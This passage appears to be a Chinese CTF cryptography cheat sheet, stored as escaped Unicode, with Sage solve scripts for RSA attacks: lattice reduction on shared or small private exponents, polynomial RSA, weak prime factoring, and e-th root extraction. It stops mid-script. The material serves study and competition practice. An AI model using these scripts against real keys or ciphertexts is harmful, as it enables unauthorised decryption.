\u52a0\u5bc6\u7528\u540c\u6837\u7684\u79c1\u94a5\u5e76\u4e14\u79c1\u94a5\u6bd4\u8f83\u77ed\uff0c\u4ece\u800c\u5bfc\u81f4\u4e86\u52a0\u5bc6\u7cfb\u7edf\u88ab\u7834\u89e3\u3002 \u5047\u5b9a\uff1a $$\\begin{cases} e_1d=1+k_1\\varphi(N_1) \\newline e_2d=1+k_2\\varphi(N_2) \\newline {\\vdots} \\newline e_rd=1+k_r\\varphi(N_r) \\end{cases}$$ \u5176\u4e2d\uff0c$$N_1 \\lt N_2 \\lt \\cdots \\lt N_r \\lt 2N_1$$\u3002 \u6784\u9020\u683c\uff1a $$B_r=\\begin{bmatrix}{M}&{e_1}&{e_2}&{\\cdots}&{e_{r}}\\newline {0}&{-N_1}&{0}&{\\cdots}&{0}\\newline{0}&{0}&{-N_2}&{\\cdots}&{0}\\newline{\\vdots}&{\\vdots}&{\\vdots}&{\\ddots}&{\\vdots}\\newline{0}&{0}&{0}&{\\cdots}&{-N_r}\\newline\\end{bmatrix}$$ \u5176\u4e2d $$M=\\lfloor N_r^{\\frac{1}{2}} \\rfloor$$\u3002 \u518d\u5229\u7528 LLL\u7b97\u6cd5 \u8fdb\u884c\u89c4\u7ea6\u5f97\u5230 $$\\vert b_1\\vert=Md$$\uff0c\u5219 $$d=\\cfrac{\\vert b_1 \\vert}{M}$$\uff0c\u4ece\u800c\u89e3\u5bc6\u5bc6\u6587\u5f97\u5230\u660e\u6587\u3002 \u4f7f\u7528\u6761\u4ef6\uff1a $$d \\lt N_r^{\\delta_r}\uff0c\\delta_r \\lt \\cfrac{1}{2}-\\cfrac{1}{2(r+1)}-\\log_{N_r}{(6)}$$ * \u53c2\u8003\uff1a Lattice Based Attack on Common Private Exponent RSA SCTF 2020 - RSA ###Sage### from gmpy2 import * e0= n0= c0= e1= n1= c1= e2= n2= c2= M=iroot(int(n2),int(2))[0] a=[0]*4 a[0]=[M,e0,e1,e2] a[1]=[0,-n0,0,0] a[2]=[0,0,-n1,0] a[3]=[0,0,0,-n2] Mat = matrix(ZZ,a) Mat_LLL=Mat.LLL() d = abs(Mat_LLL[0][0])/M print(bytes.fromhex(hex(pow(c1,int(d),int(n1)))[2:])) \u200b \u591a\u7ec4\u4f4e\u89e3\u5bc6\u6307\u6570\u653b\u51fb \u9002\u7528\u60c5\u51b5\uff1a2-4\u7ec4 $$e$$\uff0c\u4e14 $$d$$ \u8f83\u5c0f \u7ed9\u5b9a2\u7ec4 $$g=\\gcd(p-1,q-1),\\lambda(n)=\\frac{\\varphi(n)}{g},s=1-p-q$$ \u4e14\u6709 $$ed-k\\lambda(n)=1$$\uff0c\u5f97\u5230 $$edg-kn=g+ks\\quad (1)$$ \u8bbe $$e_1$$ \u5bf9\u5e94 $$k_1$$\uff0c$$e_2$$ \u5bf9\u5e94 $$k_2$$\uff0c\u5219\u6709 $$k_{2}d_{1}e{1}-k_{1}d_{2}e_{2}=k_{2}-k_{1}\\quad (2)$$ \u7531(1)(2)\u6709\uff1a $\\left\\{ \\begin{matrix} e_{1}d_{1}g-k_{1}n=g+k_{1}s \\newline k_{2}d_{1}e{1}-k_{1}d_{2}e_{2}=k_{2}-k_{1} \\newline e_{1}e_{2}d_{1}d_{2}g_{2}-e_{1}d_{1}gk_{2}n-e_{2}d_{2}gk_{1}n+k_{1}k_{2}n^{2}=(g+k_{1}s)(g+k_{2}s) \\end{matrix} \\right.$ \u4e0a\u8ff0\u7b49\u5f0f\u7ec4\u4e5f\u53ef\u8868\u793a\u4e3a $$bL_2 =[k_{1}k_{2},k_{2}d_{1}g,k_{1}d_{2}g,d_{1}d_{2}g^{2}]\\cdot\\left[ \\begin{matrix} n & -M_{1}n & 0 & n^{2} \\newline 0 & M_{1}e_{1} & M_{2}e_{1} & -e_{1}n \\newline 0 & 0 & -M_{2}e_{2} & -e_{2}n \\newline 0 & 0 & 0 & e_{1}e_{2} \\end{matrix} \\right] =[k_{1}k_{2}n,M_{1}k_{2}(g+k_{1}s),M_{2}g(k_{2}-k_{1})\uff0c(g+k_{1}s)(g+k_{2}s)]$$ \uff08\u5176\u4e2d $$M_{1}=n^{1/2},M_{2}=n^{1+\\alpha_{2}},d\\approx n^{\\alpha_{2}}$$\uff09 \u5bf9\u90e8\u5206\u53c2\u6570\u8fdb\u884c\u4e0a\u754c\u4f30\u8ba1\uff0ck\u4e0a\u754c\u8fd1\u4f3c\u4e8e $$d\\approx N^{\\alpha_{2}}$$, $$|s|$$ \u4e0a\u754c $$\\approx N^{1/2}$$\uff0c$$g$$ \u4e00\u822c\u76f8\u5bf9\u6781\u5c0f \u56e0\u6b64\u4e0a\u9762\u7684\u77e9\u9635\u8868\u793a $$BA=C$$ \u4e2d\uff0c$$C$$ \u7684\u6bcf\u4e2a\u5143\u7684size\u90fd\u8fd1\u4f3c $$n^{1+2\\alpha_{2}}$$\uff0c\u6240\u4ee5 $$|C|\\approx 2\\cdot n^{1+2\\alpha_{2}}$$ $$B$$ \u4f5c\u4e3a\u683c\u57fa\u7684\u683c\u4e2d\uff0c\u6700\u77ed\u5411\u91cf\u7531Minkowski Bounds\u77e5 $$\\approx \\sqrt{4}\\det(B)^{1/4}\\approx 2\\cdot n^{(13/2+\\alpha_{2})/4}$$ \u56e0\u6b64\u53ea\u8981\u6ee1\u8db3 $$n^{1+2\\alpha_{2}}<n^{(13/2+\\alpha_{2})/4}$$ \u5373\u53ef\u5c06\u95ee\u9898\u8f6c\u5316\u4e3aSVP\uff08$$\\alpha_{2}<\\frac{5}{14}$$\uff09 from sage.all import * import gmpy2 N = e1 = e2 = c = for i in range(1000): alpha2 = i/1000 M1 = int(gmpy2.mpz(N)**0.5) M2 = int( gmpy2.mpz(N)**(1+alpha2) ) D = diagonal_matrix(ZZ, [N, M1, M2, 1]) B = Matrix(ZZ, [ [1, -N, 0, N**2], [0, e1, -e1, -e1*N], [0, 0, e2, -e2*N], [0, 0, 0, e1*e2] ]) * D L = B.LLL() v = Matrix(ZZ, L[0]) x = v * B**(-1) phi = (x[0,1]/x[0,0]*e1).floor() try: d = inverse_mod( 65537, phi) m = hex(power_mod(c, d, N))[2:] if m.startswith('44415343'): print(i) print(bytes.fromhex(m)) break except: pass \u53c2\u8003\uff1a De1CTF 2020 - easyRSA \u7ed9\u5b9a3\u7ec4 \u7c7b\u4f3c2\u7ec4\u60c5\u51b5\uff0c\u5176\u4e2d $$b=[k_1k_2k_3,d_1gk_2k_3,k_1d_2gk_3,d_1d_2g^2k_3,k_1k_2d_3g,k_1d_3g,k_2d_3g,d_1d_2d_3g^3]$$ $$L_3=\\left[\\begin{matrix} 1-N & 0 & N^2 & 0 & 0 & 0 & -N^3 \\newline e_1 & -e_1 & -e_1N & -e & 0 & e_1N & e_1N^2 \\newline 0 & e_2 & -e_2N & 0 & e_2N & 0 & e_2N^2 \\newline 0 & 0 & e_1e_2 & 0 & -e_1e_2 & -e_1e_2 & -e_1e_2N \\newline 0 & 0 & 0 & e_3 & -e_3N & -e_3N & e_3N^3 \\newline 0 & 0 & 0 & 0 & e_1e_3 & 0 & -e_1e_3N \\newline 0 & 0 & 0 & 0 & 0 & e_2e_3 & -e_2e_3N \\newline 0 & 0 & 0 & 0 & 0 & 0 & e_1e_2e_3 \\end{matrix}\\right] \\times D$$ \u5176\u4e2d $$D={\\rm diag}(N^{3/2},N,N^{(3/2)+\\alpha_3},N^{1/2},N^{(3/2)+\\alpha_3},N^{1+\\alpha_3},N^{1+\\alpha_3}\uff0c1)$$ \u53c2\u8003\uff1a 3kCTF - RSA Textbook from sage.all import * import gmpy2 N = e1 = e2 = e3 = c = for i in range(1000): alpha2 = i/1000 M1 = int(gmpy2.mpz(N)**(3./2)) M2 = int( gmpy2.mpz(N) ) M3 = int(gmpy2.mpz(N)**(3./2 + alpha2)) M4 = int( gmpy2.mpz(N)**(0.5) ) M5 = int( gmpy2.mpz(N)**(3./2 + alpha2) ) M6 = int( gmpy2.mpz(N)**(1.+alpha2) ) M7 = int( gmpy2.mpz(N)**(1.+alpha2) ) D = diagonal_matrix(ZZ, [M1, M2, M3, M4, M5, M6, M7, 1]) B = Matrix(ZZ, [ [1, -N, 0, N**2, 0, 0, 0, -N**3], [0, e1, -e1, -e1*N, -e1, 0, e1*N, e1*N**2], [0, 0, e2, -e2*N, 0, e2*N, 0, e2*N**2], [0, 0, 0, e1*e2, 0, -e1*e2, -e1*e2, -e1*e2*N], [0, 0, 0, 0, e3, -e3*N, -e3*N, e3*N**2], [0, 0, 0, 0, 0, e1*e3, 0, -e1*e3*N], [0, 0, 0, 0, 0, 0, e2*e3, -e2*e3*N], [0, 0, 0, 0, 0, 0, 0, e1*e2*e3] ]) * D L = B.LLL() v = Matrix(ZZ, L[0]) x = v * B**(-1) phi_ = (e1*x[0,1]/x[0,0]).floor() try: d = inverse_mod( 65537, phi_) m = hex(power_mod(c, d, N))[2:] if m.startswith('44415343'): print(i) print(bytes.fromhex(m)) break except: pass \u7ed9\u5b9a\u66f4\u591a\u7ec4 \u897f\u6e56\u8bba\u5251 2021 - WienerStudyTwice * \u53c2\u8003Paper Common Modulus Attacks on Small Private Exponent RSA and Some Fast Variants (in Practice) Extending Wiener\u2019s Attack in the Presence of Many Decrypting Exponents \u200b \u591a\u9879\u5f0fRSA \u5728\u6574\u6570RSA\u539f\u7406\u57fa\u7840\u4e0a\u5c06\u591a\u9879\u5f0f\u4ee3\u5165\u5206\u6790\uff1a \u5728\u6709\u9650\u57df\u4e0a\u9009\u53d6\u4e24\u4e2a\u4e0d\u53ef\u7ea6\u591a\u9879\u5f0f $$g(p),g(q)$$\uff0c$$g(n)=g(p) \\cdot g(q)$$\uff0c\u8ba1\u7b97\u51fa $$g(n)$$ \u7684\u6b27\u62c9\u51fd\u6570 $$\\varphi(g(n))=\\varphi$$\uff0c \u9009\u53d6\u4e00\u4e2a\u6574\u6570 $$e$$ \u4f5c\u4e3a\u516c\u94a5\uff0c$$e$$ \u4e0e $$\\varphi$$ \u662f\u4e92\u7d20\u7684\uff0c\u90a3\u4e48\u5bf9\u4e8e\u660e\u6587 $$g(m)$$\uff0c\u52a0\u5bc6\u8fc7\u7a0b\u4e3a $$g(m)^e \\equiv g(c) \\pmod {g(n)}$$\uff0c \u8ba1\u7b97\u79c1\u94a5 $$d$$ \u6ee1\u8db3 $$ed \\equiv 1 \\pmod \\varphi$$\uff0c\u5219 $$g(c)^d \\equiv (g(m)^e)^d \\equiv g(m)^{ed} \\equiv g(m)^{\\varphi+1} \\pmod {g(n)}$$\uff0c \u540c\u6837\u8003\u8651 $$g(n)$$ \u4e0e $$g(m)$$ \u4e92\u7d20\uff0c\u6b27\u62c9\u5b9a\u7406\u5bf9\u4e8e\u591a\u9879\u5f0f\u4ea6\u6210\u7acb\uff0c \u5f97\u5230 $$g(m)^{\\varphi+1} \\equiv g(m) \\pmod {g(n)}$$\uff0c\u6240\u4ee5 $$g(c)^d \\equiv g(m) \\pmod {g(n)}$$\u3002 \u663e\u7136RSA\u5bf9\u4e8e\u6574\u6570\u7684\u4f53\u5236\u53ef\u4ee5\u9002\u7528\u4e8e\u6709\u9650\u57df\u4e0a\u7684\u591a\u9879\u5f0f\u3002 \u2605\u6ce8\u610f\uff1a \u5bf9\u4e8e\u7d20\u6570 $$x$$\uff0c$$\\varphi(x)=x-1$$\uff0c\u4f46\u662f\u5bf9\u4e8e\u4e0d\u53ef\u7ea6\u591a\u9879\u5f0f $$g(x)$$\uff0c$$\\varphi(g(x))=p^n-1$$\u3002\uff08\u6b64 $$p$$ \u4e3a $$GF(p)$$ \u7684\u6a21\uff0c\u6b64 $$n$$ \u4e3a\u591a\u9879\u5f0f\u6700\u9ad8\u9879\u6b21\u6570\uff09 \u539f\u56e0\uff1a \u7531\u6b27\u62c9\u51fd\u6570\u5b9a\u4e49\u672c\u8eab\uff0c\u6b27\u62c9\u51fd\u6570\u662f\u5c0f\u4e8e $$n$$ \u7684\u6240\u6709\u4e0e $$n$$ \u4e92\u8d28\u7684\u6570\u7684\u4e2a\u6570\u3002 \u591a\u9879\u5f0f\u7684\u6b27\u62c9\u51fd\u6570\u5219\u7c7b\u4f3c\uff0c\u8868\u793a\u4e0d\u9ad8\u4e8e $$g(x)$$ \u5e42\u7ea7\u7684\u73af\u5185\u6240\u6709\u591a\u9879\u5f0f\u4e2d\uff0c\u4e0e $$g(x)$$ \u65e0\u516c\u56e0\u5f0f\uff08\u975e1\uff09\u7684\u5176\u4ed6\u591a\u9879\u5f0f\u7684\u4e2a\u6570\uff0c\u6240\u4ee5\u6bcf\u4e00\u4e2a\u4e0d\u9ad8\u4e8e $$g(x)$$ \u5e42\u7ea7\u7684\u73af\u5185\u591a\u9879\u5f0f\uff08\u9664\u4e86\u5b83\u81ea\u5df1\uff09\u5747\u6ee1\u8db3\u6b64\u6761\u4ef6\u3002 #\u811a\u672c1 #Sage #\u5df2\u77e5p,n,m^e p= P = PolynomialRing(Zmod(p), name = 'x') x = P.gen() e = n = c = #\u5206\u89e3N q1, q2 = n.factor() q1, q2 = q1[0], q2[0] #\u6c42\u03c6\uff0c\u6ce8\u610f\u6c42\u6cd5\uff0c phi = (p**q1.degree() - 1) * (p**q2.degree() - 1) assert gcd(e, phi) == 1 d = inverse_mod(e, phi) m = pow(c,d,n) #\u53d6\u591a\u9879\u5f0f\u7cfb\u6570 flag = bytes(m.coefficients()) print(\"Flag: \", flag.decode()) #\u811a\u672c2 #Sage #\u5df2\u77e5p=2,n,e,c p = P = PolynomialRing(GF(p), name = 'x') x = P.gen() e = n = R.<a> = GF(2^2049) c = [] q1, q2 = n.factor() q1, q2 = q1[0], q2[0] phi = (p**q1.degree() - 1) * (p**q2.degree() - 1) assert gcd(e, phi) == 1 d = inverse_mod(e, phi) ans = '' for cc in c: cc = P(R.fetch_int(cc)) m = pow(cc,d,n) m = R(P(m)).integer_representation() print(m) ans += chr(m) print(ans) \u53c2\u8003\uff1a 0ctf - babyrsa watevrCTF 2019 - Swedish RSA InCTF 2020 - PolyRSA Polynomial based RSA \u200b Weak prime factors \uff08p\u5177\u7ebf\u6027\u7279\u5f81\uff09 \u9002\u7528\u60c5\u51b5\uff1a$$p$$ \u6ee1\u8db3 $$ap=u_0+M_1u_1+\\cdots+M_ku_k$$ \u5148\u6839\u636e $$n$$ \u786e\u5b9a $$M$$ \u7684\u5927\u5c0f\uff0c\u518d\u6839\u636e $$M$$ \u9009\u53d6\u7b26\u5408\u8981\u6c42\u7684 $$k$$ \u548c $$c$$\uff0c\u7136\u540e\u6784\u9020\u4e00\u4e2a\u683c\u5982\u4e0b\uff1a $$M(\\mathcal{L})=\\begin{bmatrix}{1}&{0}&{0}&{\\cdots}&{0}&{CM^{2k}} \\newline {0}&{1}&{0}&{\\cdots}&{0}&{CM^{2k-1}} \\newline {\\vdots}&{\\vdots}&{\\vdots}&{\\ddots}&{\\vdots}&{\\vdots} \\newline {0}&{0}&{0}&{\\cdots}&{1}&{CM} \\newline {0}&{0}&{0}&{\\cdots}&{0}&{-CN} \\newline \\end{bmatrix}$$ \u7528LLL\u7b97\u6cd5\u8fdb\u884c\u683c\u57fa\u89c4\u7ea6\uff0c\u5c06\u89c4\u7ea6\u540e\u7684\u67d0\u4e2a\u5411\u91cf\u4f5c\u4e3a\u591a\u9879\u5f0f\u7cfb\u6570\uff0c\u518d\u5bf9\u591a\u9879\u5f0f\u8fdb\u884c\u5206\u89e3\uff0c\u5373\u53ef\u5b8c\u6210\u5bf9 $$n$$ \u7684\u5206\u89e3\u3002 \u53c2\u8003 Factoring RSA moduli with weak prime factors N1CTF2020 - easyRSA from tqdm import tqdm import gmpy2 class success(Exception): pass def attack_weak_prime(basenum, exp, n): m = basenum^exp k = len(n.str(base=basenum))//(2*exp) + 1 c = gmpy2.iroot(2*k^3, int(2)) # assert c[1] == True tmp = int(c[0]) try: for c in tqdm(range(1, tmp)): amount = 2*k+1 M = Matrix(RationalField(), amount, amount) for i in range(amount): M[i, i] = 1 M[i, amount-1] = c*m^(2*k-i) M[amount-1, amount-1] = -c*n new_basis = M.LLL(delta=0.75) for j in range(amount): last_row = list(new_basis[j]) last_row[-1] = last_row[-1]//(-c) poly = sum(e * x^(k*2-i) for i,e in enumerate(last_row)) fac = poly.factor_list() if len(fac) == 2: p_poly, q_poly = fac p_coefficient = p_poly[0].list() q_coefficient = q_poly[0].list() ap = sum(m^i * j for i,j in enumerate(p_coefficient)) bq = sum(m^i * j for i,j in enumerate(q_coefficient)) p = gcd(ap, n) q = gcd(bq, n) if (p*q == n) and (p != 1) and (q != 1): raise success except: print ('n =', n) print ('p =', p) print ('q =', q) print ('p*q == n ?', bool(p*q == n)) if __name__ == '__main__': print ('[+] Weak Prime Factorization Start!') print ('-------------------------------------------------------------------------------------------------------------------------------') basenum, exp = (3, 66) n = 32846178930381020200488205307866106934814063650420574397058108582359767867168248452804404660617617281772163916944703994111784849810233870504925762086155249810089376194662501332106637997915467797720063431587510189901 \u200b \u5176\u4ed6\u7279\u522b\u60c5\u5f62 \u591a\u7d20\u6570\u56e0\u5b50\uff08Multi-prime RSA\uff09 $$n=p_1^{k_1}p_2^{k_2}\\cdots p_m^{k_m} \\ \\Rightarrow \\begin{eqnarray}\\varphi(n) &=&\\varphi(p_1^{k_1})\\varphi(p_2^{k_2}) \\cdots \\varphi(p_m^{k_m}) \\ &=&(p_1^{k_1-1}\\cdot(p_1-1))(p_2^{k_2-1}\\cdot(p_2-1)) \\cdots (p_m^{k_m-1}\\cdot(p_m-1)) \\end{eqnarray}$$ \u200b * ##### next_prime() \u6839\u636e\u7d20\u6570\u5b9a\u7406\uff0c\u7d20\u6570\u7684\u5e73\u5747\u95f4\u9694\u4e3a\uff1a$$\\cfrac{x}{\\pi(x)} \\approx \\ln(x)$$\uff0c\u56e0\u6b64\u5e38\u89c1\u7684\u4e0b\u4e00\u4e2a\u7d20\u6570\u6bd4\u5f53\u524d\u7d20\u6570\u5927\u4e00\u70b9\uff0c\u4e00\u822c\u4e0d\u4f1a\u8d85\u8fc71500\u3002 \u53d8\u79cd1 \uff1a$$n=p \\cdot q \\cdot \\text{nextprime}(p) \\cdot \\text{nextprime}(q)$$ \u8d39\u9a6c\u56e0\u5f0f\u5206\u89e3 \u3002\u200b * \u7ed9 e,p,c $$c \\equiv m^e \\pmod n \\ \\Leftrightarrow c_1 \\equiv c \\pmod p \\equiv m^e \\pmod p$$ \u4ee4 $$ed_1 \\equiv 1 \\pmod {(p-1)}$$\uff0c\u6709 $$m \\equiv c^d \\pmod n \\equiv c_1^{d_1} \\pmod p$$\u3002 \u200b * ##### \u7ed9 e,d,modinv(q,p),c \u5df2\u77e5\uff1a$$p,q$$ \u540c\u6bd4\u7279\u4f4d\u6570\u3002 \u4ee4 $$cf=q^{-1} \\bmod p$$\uff0c\u6709 $$q\\cdot cf=1 \\pmod p$$\u3002 $$ed=1+k(p-1)(q-1)$$\uff0c \u6bd4\u8f83\u6bd4\u7279\u4f4d\u6570\uff0c$$k$$ \u4e0e $$e$$ \u540c\u957f\uff0c\u53ef\u7206\u7834 $$k$$\uff0c\u5f97 $$\\varphi(n)=(p-1)(q-1)=\\cfrac{ed-1}{k}$$\uff1b + \u4e0a\u5f0f $$\\varphi(n) =(p-1)(q-1) \\pmod p=-(q-1) \\pmod p$$\uff0c \u7ed3\u5408 $$q\\cdot cf=1 \\pmod p$$\uff0c\u5373 $$q\\cdot cf-1=0 \\pmod p$$\uff0c \u8054\u7acb\uff1a $$\\begin{eqnarray} \\varphi(n)&=&(p-1)(q-1) \\ &=&pq-p-q+1 \\ &=&n-p-q+1 \\end{eqnarray}$$ $$\\begin{eqnarray} cf\\cdot \\varphi(n)&=&cf\\cdot(n-p-q+1) \\ &=&cf\\cdot n-cf\\cdot p-cf\\cdot q+cf \\end{eqnarray}$$ $$\\begin{eqnarray} cf\\cdot \\varphi(n) \\bmod p&=&(cf\\cdot n-cf\\cdot p-cf\\cdot q+cf) \\bmod p \\ &=&0-0-(cf\\cdot q)+cf \\bmod p \\ &=&-1+cf \\bmod p \\end{eqnarray}$$ \u6709 $$1+cf\\cdot \\varphi(n)-cf=0\\pmod p$$\uff0c \u5373$$x=1+cf\\cdot \\varphi(n)-cf$$ \u80fd\u88ab $$p$$ \u6574\u9664\uff1b + \u7531\u8d39\u9a6c\u5c0f\u5b9a\u7406\uff0c\u5b58\u5728 $$r$$ \u6ee1\u8db3 $$r^{p-1}=1 \\pmod p$$\uff0c $$\\begin{eqnarray}r^{\\varphi(n)}&=&(r^{(p-1)})^{(q-1)} \\ &=&1^{(q-1)} \\pmod p \\ &=&1 \\pmod p \\end{eqnarray}$$\uff0c \u56e0\u5bf9\u4e8e\u4efb\u610f $$r,k_1,k_2$$\uff0c\u5f53 $$k_2$$ \u4e3a $$k_1$$ \u56e0\u5b50\u65f6\uff0c$$r \\bmod k_2=(r \\bmod k_1) \\bmod k_2$$\uff0c \u6545 $$r^{\\varphi(n)} \\bmod p=(r^{\\varphi(n)} \\bmod x) \\bmod p=1 \\bmod p=kp$$\uff0c \u5df2\u77e5 $$\\varphi(n)$$\uff0c\u7531 $$(r^{\\varphi(n)} \\bmod x) \\bmod p=kp$$ \u53ef\u5f97\u5230\u591a\u7ec4 $$p$$ \u7684\u4e58\u79ef\uff0c\u8ba1\u7b97 $$\\gcd$$ \u53ef\u5f97\u5230 $$p$$\uff1b + \u7531 $$q\\cdot cf=1 \\pmod p$$ \u6c42\u6a21\u9006\u53ef\u5f97 $$q$$\uff0c\u518d\u7528 $$c$$ \u8ba1\u7b97\u51fa $$m$$\u3002 \u53c2\u8003\uff1a TSG CTF 2020 - Modulus Amittendus \u200b * ##### gcd(e,\u03c6(n)) \u2260 1 $$\\gcd(e,\\varphi(n))\\neq 1$$ \u65f6\uff0c$$e$$ \u4e0e $$\\varphi(n)$$ \u4e0d\u4e92\u7d20\uff0c $$m^e \\equiv (m^{\\gcd(e,\\varphi(n))})^{\\frac{e}{\\gcd(e,\\varphi(n))}} \\equiv c \\pmod n$$\uff0c\u8ba1\u7b97 $$\\frac{e}{\\gcd(e,\\varphi(n))}$$ \u7684\u6a21\u9006 $$d\u2019$$\uff0c \u5219 $$c^{d\u2019}\\equiv m^{\\gcd(e,\\varphi(n))}\\pmod n$$\u3002 \u5f53 $$\\gcd(e,\\varphi(n))$$ \u8f83\u5c0f\u65f6\uff0c\u53ef\u4ee5\u76f4\u63a5\u5bf9 $$c$$ \u5f00\u6839\uff0c\u6709\u4e24\u79cd\u60c5\u51b5\uff1a $$m^e = c<n$$\uff0c\u8fd9\u79cd\u60c5\u51b5\u76f4\u63a5\u5bf9 $$c$$ \u5f00 $$e$$ \u6b21\u65b9\u5373\u53ef\uff1b $$m^e = c>n$$\uff0c\u8fd9\u79cd\u60c5\u51b5\u9700\u8981\u5728\u6709\u9650\u57df\u4e0b\u5bf9 $$c$$ \u5f00\u65b9\uff0c\u4e00\u822c\u5148\u8ba1\u7b97 $$c_p=c \\bmod p$$\uff0c$$c_q=c \\bmod q$$\uff0c\u5206\u522b\u6c42\u51fa $$c_p,c_q$$ \u5728 $$c$$ \u4e0b\u7684 $$e$$ \u6b21\u6839\uff08\u53ef\u80fd\u6709\u591a\u4e2a\uff09\uff0c\u7136\u540e\u4f7f\u7528CRT\u904d\u5386\u6240\u6709\u7ec4\u5408\uff0c\u5206\u522bcheck\u5f97\u51fa\u660e\u6587\u3002\u5f53 $$\\gcd(e,\\varphi(n))$$ \u8f83\u5927\u65f6\uff0c\u6c42 $$p,q$$ \u7684 $$e$$ \u6b21\u6839\u6b65\u9aa4\u9700\u8981\u66ff\u6362\u4e3a\u4e00\u4e9b\u6709\u9650\u57df\u5f00\u6839\u7684\u9ad8\u6548\u7b97\u6cd5\uff08\u5982AMM\u7b97\u6cd5\u7b49\uff09\u8fdb\u884c\u8ba1\u7b97\u3002 \u53c2\u8003\uff1a De1CTF2019 - Baby RSA 0ctf 2016 - RSA? \u200b * ##### e|(p-1), e|(q-1) \u4e0a\u9762\u7684 $$\\gcd(e,\\varphi(n))\\neq 1$$ \u60c5\u51b5\u4e0d\u9488\u5bf9 $$\\gcd(e,\\varphi(n))= e$$\uff0c\u8fd9\u91cc\u5bf9 $$e\\mid (p-1),e\\mid (q-1)$$ \u7684\u7279\u6b8a\u60c5\u51b5\u8fdb\u884c\u8ba8\u8bba\u3002 \u89e3\u9898\u601d\u8def\u5373\u6c42\u89e3 $$m \\bmod p$$ \u548c $$m \\bmod q$$ \uff0c\u518d\u901a\u8fc7CRT\u8fd8\u539f $$m \\bmod n$$\u3002\u4e3b\u8981\u96be\u70b9\u5219\u662f\u5728 $$\\text{GF}(p)$$ \u4e0a\u6c42 $$e$$ \u6b21\u6839\u3002 \u5728\u6709\u9650\u57df\u4e0a\u6c42r-th root\u6709\u4e24\u4e2a\u5e38\u89c1\u7b97\u6cd5\uff08Adleman-Manders-Miller algorithm\u548cCipolla-Lehmer algorithm\uff09\uff0cNamhun Koo\u63d0\u51fa\u4e00\u79cd\u66f4\u5177\u4e00\u822c\u6027\u7684\u5f00\u6839\u7b97\u6cd5\uff0c\u4e14\u5728 $$s$$ \u8db3\u591f\u5c0f\u7684\u65f6\u5019\u66f4\u9ad8\u6548\uff08$$r^{s}\\mid (p-1),r^{s}\\nmid (p-1)$$\uff09\u3002 \u2605 \u53c2\u8003 \uff1a NCTF 2019 - easyRSA \uff08 Adleman-Manders-Miller rth Root Extraction Method \uff09 \u672c\u9898\u5219\u4e3a $$e$$ \u548c $$p-1$$ \uff08\u6216 $$q-1$$\uff09\u7684\u6700\u5927\u516c\u7ea6\u6570\u5c31\u662f $$e$$ \u672c\u8eab\uff0c\u4e5f\u5c31\u662f\u8bf4 $$e\\mid (p-1)$$\uff0c\u53ea\u6709\u5bf9 $$c$$ \u5f00 $$e$$ \u6b21\u65b9\u6839\u624d\u884c\u3002 \u53ef\u4ee5\u5c06\u540c\u4f59\u65b9\u7a0b $$m^e \\equiv c \\pmod n$$ \u5316\u6210 $$\\begin{cases} m^e \\equiv c \\pmod p \\ m^e \\equiv c \\pmod q \\end{cases}$$ \u7136\u540e\u5206\u522b\u5728 $$\\text{GF}(p)$$ \u548c $$\\text{GF}(q)$$ \u4e0a\u5bf9 $$c$$ \u5f00 $$e$$ \u6b21\u65b9\u6839\uff0c\u518d\u7528CRT\u7ec4\u5408\u4e00\u4e0b\u5373\u53ef\u5f97\u5230\u5728 $$\\bmod n$$ \u4e0b\u7684\u89e3\u3002 \u95ee\u9898\u662f\uff0c \u5982\u4f55\u5728\u6709\u9650\u57df\u5185\u5f00\u6839 \uff1f \u8fd9\u91cc $$e$$ \u4e0e $$p-1$$ \u548c $$q-1$$ \u90fd\u4e0d\u4e92\u7d20\uff0c\u4e0d\u80fd\u7b80\u5355\u5730\u6c42\u4e2a\u9006\u5143\u5c31\u5b8c\u4e8b\u3002 \u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c \u5f00\u5e73\u65b9\u6839 \u53ef\u4ee5\u7528 Tonelli\u2013Shanks algorithm \uff0c Wiki \u8bf4\u8fd9\u4e2a\u7b97\u6cd5\u53ef\u4ee5 \u6269\u5c55\u5230\u5f00n\u6b21\u65b9\u6839 \u3002 \u5728\u8fd9\u7bc7 paper \u91cc\u7ed9\u51fa\u4e86\u5177\u4f53\u7684\u7b97\u6cd5\uff1a Adleman-Manders-Miller rth Root Extraction Method \u3002 \u8fd9\u4e2a\u7b97\u6cd5\u53ea\u80fd\u5f00\u51fa\u4e00\u4e2a\u6839\uff0c\u5b9e\u9645\u4e0a\u5f00 $$e$$ \u6b21\u65b9\uff0c\u6700\u591a\u4f1a\u6709 $$e$$ \u4e2a\u6839\uff08\u8fd9\u9898\u7684\u60c5\u51b5\u4e0b\u67090x1337\u4e2a\u6839\uff09\u3002 \u5982\u4f55\u627e\u5230\u5176\u4ed6\u6839\uff1f StackOverflow \u2013 Cube root modulo P \u7ed9\u51fa\u4e86\u65b9\u6cd5\u3002 \u5982\u4f55\u627e\u5230\u6240\u6709\u7684 primitive 0x1337th root of 1 ? StackExchange \u2013 Finding the n-th root of unity in a finite field \u7ed9\u51fa\u4e86\u65b9\u6cd5\u3002 Exploit \uff08\u4ee5 e=0x1337 \u200b \u4e3a\u4f8b\uff09 \u5148\u7528 Adleman-Manders-Miller rth Root Extraction Method \u5728 $$\\text{GF}(p)$$ \u548c $$\\text{GF}(q)$$ \u4e0a\u5bf9 $$c$$ \u5f00 $$e$$ \u6b21\u65b9\u6839\uff0c\u5206\u522b\u5f97\u5230\u4e00\u4e2a\u89e3\u3002\u5927\u6982\u4e0d\u523010\u79d2\u3002 \u7136\u540e\u53bb\u627e\u5230\u6240\u6709\u7684 0x1336 \u4e2a primitive nth root of 1 \uff0c\u4e58\u4ee5\u4e0a\u9762\u90a3\u4e2a\u89e3\uff0c\u5f97\u5230\u6240\u6709\u7684 0x1337 \u4e2a\u89e3\u3002\u5927\u69821\u5206\u949f\u3002 \u518d\u7528CRT\u5bf9 $$\\text{GF}(p)$$ \u548c $$\\text{GF}(q)$$ \u4e0a\u7684\u4e24\u7ec4 0x1337 \u4e2a\u89e3\u7ec4\u5408\u6210 $$\\bmod n$$ \u4e0b\u7684\u89e3\uff0c\u53ef\u4ee5\u5f97\u5230 0x1337**2=24196561 \u4e2a $$\\bmod n$$ \u7684\u89e3\u3002\u6700\u540e\u80fd\u901a\u8fc7 check() \u7684\u5373\u4e3aflag\u3002\u5927\u6982\u5341\u51e0\u5206\u949f\u3002 #\u811a\u672c1 #Sage import random import time # About 3 seconds to run def AMM(o, r, q): start = time.time() print('\\n----------------------------------------------------------------------------------') print('Start to run Adleman-Manders-Miller Root Extraction Method') print('Try to find one 